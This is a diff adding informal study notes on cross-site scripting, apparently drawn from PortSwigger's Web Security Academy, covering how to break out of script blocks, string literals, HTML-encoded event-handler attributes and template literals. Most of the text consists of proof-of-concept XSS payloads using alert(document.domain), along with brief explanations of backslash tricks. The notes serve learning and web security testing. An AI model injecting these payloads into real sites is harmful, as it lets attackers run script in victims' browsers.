@@ -77,3 +77,70 @@ Visit our Web Security Academy to learn more about cross-site scripting (XSS)
 
 note# use single qoutes to close values incase double doesent works e.g
 <script>accesskey='x' onclick='alert(1)</script>
+
+
+terminating exisiting javascript
+====
+ then you can use the following payload to break out of the existing JavaScript and execute your own:
+</script><img src=1 onerror=alert(document.domain)>
+
+#note sometimes ...backlashes and single qoutes can be escaped its left for the tester to find a way to undo such by closing a string with </script> before droping a payload
+
+Breaking out of java script srings
+====
+sometimes the string has to be repaired after being broke out of for the payload to run 
+
+ Some useful ways of breaking out of a string literal are: 
+ < script>
+'-alert(document.domain)-'
+';alert(document.domain)//
+
+
+This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application.
+
+For example, suppose that the input:
+';alert(document.domain)//
+
+gets converted to:
+\';alert(document.domain)//
+
+You can now use the alternative payload:
+\';alert(document.domain)//
+
+which gets converted to:
+\\';alert(document.domain)//
+
+Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. This means that the quote is now interpreted as a string terminator, and so the attack succeeds.>>>
+
+</script>
+
+making use of html encoding
+===
+
+
+ For example, if the XSS context is as follows:
+<a href="#" onclick="... var input='controllable data here'; ...">
+
+and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:
+<d>
+&apos;-alert(document.domain)-&apos;
+</d>
+
+note#
+somtimes you can join it to the normal attribute value like this
+<d>
+https://test.com&apos;-alert(1)-&apos;
+</d>
+
+
+XSS in JavaScript template literals
+===
+
+ For example, the following script will print a welcome message that includes the user's display name:
+ <d>
+document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
+</d>
+ then you can use the following payload to execute JavaScript without terminating the template literal:
+ <d>
+${alert(document.domain)}
+</d>
